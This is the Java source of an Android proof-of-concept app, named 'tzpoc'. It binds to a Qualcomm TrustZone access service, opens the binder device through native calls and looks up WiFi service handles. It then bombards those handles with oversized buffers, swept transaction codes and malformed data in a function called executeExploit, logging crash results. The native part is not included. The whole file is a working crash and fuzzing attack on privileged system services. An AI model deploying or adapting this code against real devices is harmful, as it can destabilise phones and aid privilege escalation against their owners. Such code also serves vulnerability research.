package com.example.tzpoc;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.ParcelFileDescriptor;
import android.os.RemoteException;
import android.view.View;
import android.widget.Button;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.qualcomm.qti.qms.api.minksocket.IMinkSocketFd;

import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicBoolean;

public class MainActivity extends AppCompatActivity {
    private static final String TARGET_PKG = "com.qualcomm.qti.qms.service.trustzoneaccess";
    private static final String TARGET_CLS = "com.qualcomm.qti.qms.service.trustzoneaccess.TZAccessService";

    private TextView tvStatus, tvLog;
    private Button btnStart, btnStop;
    private Handler handler = new Handler(Looper.getMainLooper());
    private StringBuilder logBuilder = new StringBuilder();
    private IMinkSocketFd tzService;
    private boolean isBound = false;
    private AtomicBoolean isTesting = new AtomicBoolean(false);
    private AtomicBoolean stopRequested = new AtomicBoolean(false);
    private Thread testThread;

    static {
        System.loadLibrary("pocjni");
    }

    public static native int nativeOpenDevice(String path);
    public static native byte[] nativeBinderTransaction(int fd, int handle, int code, int flags, byte[] data);
    public static native byte[] nativeBinderGetService(int fd, String serviceName);
    public static native byte[] nativeBinderGetService2(int fd, String serviceName);
    public static native String nativeBinderDumpReply(int fd, int handle, int code, int flags, byte[] data);
    public static native int nativeBinderWriteToService(int fd, int handle, int code, int flags, byte[] data);

    private ServiceConnection tzConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            tzService = IMinkSocketFd.Stub.asInterface(service);
            if (tzService != null) {
                appendLog("[TZ] Service bound");
                updateStatus("Bound - starting");
                enableButtons(false, true);
                stopRequested.set(false);
                testThread = new Thread(() -> executeExploit());
                testThread.start();
            } else {
                appendLog("[TZ] Failed to cast");
                enableButtons(true, false);
            }
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            tzService = null;
            isBound = false;
            enableButtons(true, false);
            updateStatus("Disconnected");
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        tvStatus = findViewById(R.id.tv_status);
        tvLog = findViewById(R.id.tv_log);
        btnStart = findViewById(R.id.btn_start);
        btnStop = findViewById(R.id.btn_stop);

        requestPermissions();

        btnStart.setOnClickListener(v -> {
            if (!isTesting.get()) {
                isTesting.set(true);
                enableButtons(false, true);
                stopRequested.set(false);
                bindService();
            }
        });
        btnStop.setOnClickListener(v -> {
            if (isTesting.get()) {
                stopRequested.set(true);
                if (testThread != null) testThread.interrupt();
                enableButtons(false, false);
                updateStatus("Stopping...");
                appendLog("--- Stop requested ---");
                saveLog();
                enableButtons(true, false);
                isTesting.set(false);
            }
        });
        appendLog("App started. Press 'Start'.");
    }

    private void requestPermissions() {
        String[] perms = {
                android.Manifest.permission.READ_EXTERNAL_STORAGE,
                android.Manifest.permission.WRITE_EXTERNAL_STORAGE
        };
        List<String> toRequest = new ArrayList<>();
        for (String p : perms) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                toRequest.add(p);
            }
        }
        if (!toRequest.isEmpty()) {
            ActivityCompat.requestPermissions(this, toRequest.toArray(new String[0]), 100);
        }
    }

    private void bindService() {
        try {
            Intent intent = new Intent();
            intent.setClassName(TARGET_PKG, TARGET_CLS);
            boolean ret = bindService(intent, tzConnection, Context.BIND_AUTO_CREATE);
            if (ret) {
                appendLog("Binding service...");
                updateStatus("Binding...");
                isBound = true;
            } else {
                appendLog("bindService failed");
                updateStatus("Bind failed");
                enableButtons(true, false);
                isTesting.set(false);
            }
        } catch (Exception e) {
            appendLog("Bind exception: " + e.toString());
            updateStatus("Exception");
            enableButtons(true, false);
            isTesting.set(false);
        }
    }

    private void enableButtons(boolean startEnabled, boolean stopEnabled) {
        handler.post(() -> {
            btnStart.setEnabled(startEnabled);
            btnStop.setEnabled(stopEnabled);
        });
    }

    private void executeExploit() {
        appendLog("========================================");
        appendLog("========== BINDER WRITE/CRASH TEST ==========");

        int fd = nativeOpenDevice("/dev/binder");
        if (fd < 0) {
            fd = nativeOpenDevice("/dev/hwbinder");
        }
        if (fd < 0) {
            appendLog("[!] No binder device");
            return;
        }
        appendLog("[+] Using fd=" + fd);

        String[] wifiServices = {
            "wifi",
            "wifiscanner",
            "android.net.wifi.IWifiManager",
            "com.android.server.wifi.WifiServiceImpl",
            "android.net.wifi.p2p.IWifiP2pManager",
            "wifip2p"
        };

        int wifiHandle = -1;
        for (String name : wifiServices) {
            appendLog("[GETSVC] Trying: " + name);
            byte[] reply = nativeBinderGetService(fd, name);
            if (reply != null && reply.length >= 4) {
                int handle = ((reply[0] & 0xFF) |
                              ((reply[1] & 0xFF) << 8) |
                              ((reply[2] & 0xFF) << 16) |
                              ((reply[3] & 0xFF) << 24));
                appendLog("[GETSVC] " + name + " -> handle=" + handle + " (0x" + Integer.toHexString(handle) + ")");
                dumpHex(reply, "GETSVC_" + name);
                if (handle != 0) {
                    wifiHandle = handle;
                    break;
                }
            } else {
                appendLog("[GETSVC] " + name + " -> no reply");
            }
            try { Thread.sleep(50); } catch (Exception e) {}
        }

        if (wifiHandle < 0) {
            appendLog("[GETSVC] Trying alternative method...");
            for (String name : wifiServices) {
                byte[] reply = nativeBinderGetService2(fd, name);
                if (reply != null && reply.length >= 4) {
                    int handle = ((reply[0] & 0xFF) |
                                  ((reply[1] & 0xFF) << 8) |
                                  ((reply[2] & 0xFF) << 16) |
                                  ((reply[3] & 0xFF) << 24));
                    appendLog("[GETSVC2] " + name + " -> handle=" + handle);
                    if (handle != 0) {
                        wifiHandle = handle;
                        break;
                    }
                }
                try { Thread.sleep(50); } catch (Exception e) {}
            }
        }

        if (wifiHandle < 0) {
            appendLog("[!] WiFi service not found, using handles 1-5");
            for (int h = 1; h <= 5; h++) {
                testWriteAndCrash(fd, h, "handle_" + h);
            }
        } else {
            appendLog("[*] Found WiFi handle=" + wifiHandle + ", starting crash test");
            testWriteAndCrash(fd, wifiHandle, "wifi");
        }

        appendLog("[*] Testing handle=0 with large buffer");
        byte[] largeData = new byte[65536];
        for (int i = 0; i < largeData.length; i++) largeData[i] = (byte)(i & 0xFF);
        String result = nativeBinderDumpReply(fd, 0, 0, 0, largeData);
        appendLog("[TX] handle=0 large -> " + result);

        try {
            ParcelFileDescriptor.adoptFd(fd).close();
        } catch (Exception e) {}

        appendLog("========== TEST COMPLETED ==========");
        appendLog("========================================");
        updateStatus("Done");
        isTesting.set(false);
        enableButtons(true, false);
        saveLog();
        finishTest();
    }

    private void testWriteAndCrash(int fd, int handle, String label) {
        appendLog("[CRASH] Testing " + label + " handle=" + handle);

        for (int size : new int[]{1024, 4096, 16384, 65536, 131072}) {
            if (stopRequested.get()) break;
            byte[] data = new byte[size];
            for (int i = 0; i < data.length; i++) data[i] = (byte)(i & 0xFF);
            appendLog("[CRASH] Sending " + size + " bytes to handle " + handle);
            String result = nativeBinderDumpReply(fd, handle, 1, 0, data);
            appendLog("[CRASH] result: " + result);
            try { Thread.sleep(50); } catch (Exception e) {}
        }

        int[] wifiCodes = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10,
                           11, 12, 13, 14, 15, 16, 17, 18, 19, 20,
                           21, 22, 23, 24, 25, 26, 27, 28, 29, 30,
                           31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
                           50, 51, 52, 53, 54, 55, 56, 57, 58, 59,
                           60, 61, 62, 63, 64, 65, 66, 67, 68, 69,
                           70, 71, 72, 73, 74, 75, 76, 77, 78, 79,
                           80, 81, 82, 83, 84, 85, 86, 87, 88, 89,
                           90, 91, 92, 93, 94, 95, 96, 97, 98, 99,
                           100, 101, 102, 103, 104, 105, 106, 107, 108, 109,
                           110, 111, 112, 113, 114, 115, 116, 117, 118, 119,
                           120, 121, 122, 123, 124, 125, 126, 127, 128, 129,
                           130, 131, 132, 133, 134, 135, 136, 137, 138, 139,
                           140, 141, 142, 143, 144, 145, 146, 147, 148, 149,
                           150, 151, 152, 153, 154, 155, 156, 157, 158, 159,
                           160, 161, 162, 163, 164, 165, 166, 167, 168, 169,
                           170, 171, 172, 173, 174, 175, 176, 177, 178, 179,
                           180, 181, 182, 183, 184, 185, 186, 187, 188, 189,
                           190, 191, 192, 193, 194, 195, 196, 197, 198, 199,
                           200, 0x100, 0x101, 0x102, 0x103, 0x104, 0x105, 0x106,
                           0x107, 0x108, 0x109, 0x10A, 0x10B, 0x10C, 0x10D, 0x10E,
                           0x10F, 0x110, 0x111, 0x112, 0x113, 0x114, 0x115, 0x116,
                           0x117, 0x118, 0x119, 0x11A, 0x11B, 0x11C, 0x11D, 0x11E,
                           0x11F, 0x120, 0x121, 0x122, 0x123, 0x124, 0x125, 0x126,
                           0x127, 0x128, 0x129, 0x12A, 0x12B, 0x12C, 0x12D, 0x12E,
                           0x12F, 0x130};

        for (int code : wifiCodes) {
            if (stopRequested.get()) break;
            byte[] data = new byte[64];
            for (int i = 0; i < data.length; i++) data[i] = (byte)(i + code);
            String result = nativeBinderDumpReply(fd, handle, code, 0, data);
            appendLog("[CRASH] code=0x" + Integer.toHexString(code) + " -> " + result);
            try { Thread.sleep(20); } catch (Exception e) {}
        }

        appendLog("[CRASH] Testing oneway transactions");
        for (int code : new int[]{1, 2, 3, 4, 5, 6, 7, 8, 9, 10}) {
            if (stopRequested.get()) break;
            byte[] data = new byte[128];
            for (int i = 0; i < data.length; i++) data[i] = (byte)(i);
            String result = nativeBinderDumpReply(fd, handle, code, 1, data);
            appendLog("[CRASH-ONEWAY] code=0x" + Integer.toHexString(code) + " -> " + result);
            try { Thread.sleep(10); } catch (Exception e) {}
        }

        appendLog("[CRASH] Testing invalid offset data");
        for (int size : new int[]{16, 32, 64, 128, 256, 512, 1024, 2048, 4096}) {
            byte[] d = new byte[size];
            for (int i = 0; i < d.length; i++) d[i] = (byte)((i * 7) & 0xFF);
            String result = nativeBinderDumpReply(fd, handle, 0, 0, d);
            appendLog("[CRASH-SIZE] " + size + " bytes -> " + result);
            try { Thread.sleep(10); } catch (Exception e) {}
        }
    }

    private void dumpHex(byte[] data, String label) {
        if (data == null || data.length == 0) {
            appendLog("[HEX:" + label + "] (empty)");
            return;
        }
        StringBuilder sb = new StringBuilder();
        sb.append("[HEX:" + label + "] ");
        int len = Math.min(data.length, 64);
        for (int i = 0; i < len; i++) {
            sb.append(String.format("%02x ", data[i]));
            if ((i + 1) % 16 == 0 && i < len - 1) sb.append("\n[HEX:" + label + "] ");
        }
        if (len < data.length) sb.append("... (" + data.length + " bytes)");
        appendLog(sb.toString());
    }

    private File getDumpDir() {
        if (Environment.MEDIA_MOUNTED.equals(Environment.getExternalStorageState())) {
            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (dir != null && (dir.exists() || dir.mkdirs())) return dir;
        }
        return getFilesDir();
    }

    private void appendLog(final String msg) {
        String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date());
        final String line = "[" + ts + "] " + msg + "\n";
        logBuilder.append(line);
        handler.post(() -> {
            tvLog.append(line);
            View parent = (View) tvLog.getParent();
            if (parent instanceof ScrollView) ((ScrollView) parent).fullScroll(View.FOCUS_DOWN);
        });
    }

    private void updateStatus(final String status) {
        handler.post(() -> tvStatus.setText(status));
    }

    private void saveLog() {
        try {
            File dir = getDumpDir();
            File file = new File(dir, "binder_crash_test_log.txt");
            try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8))) {
                pw.println("=== Binder Crash Test Log ===");
                pw.println("Timestamp: " + new Date().toString());
                pw.println("===================================");
                pw.print(logBuilder.toString());
                pw.flush();
            }
            appendLog("Log saved to " + file.getAbsolutePath());
        } catch (Exception e) {
            appendLog("Save failed: " + e.getMessage());
        }
    }

    private void finishTest() {
        handler.post(() -> {
            Toast.makeText(MainActivity.this, "Test completed", Toast.LENGTH_LONG).show();
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                finishAffinity();
                System.exit(0);
            }, 3000);
        });
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopRequested.set(true);
        if (testThread != null) testThread.interrupt();
        if (isBound) unbindService(tzConnection);
        saveLog();
    }
}
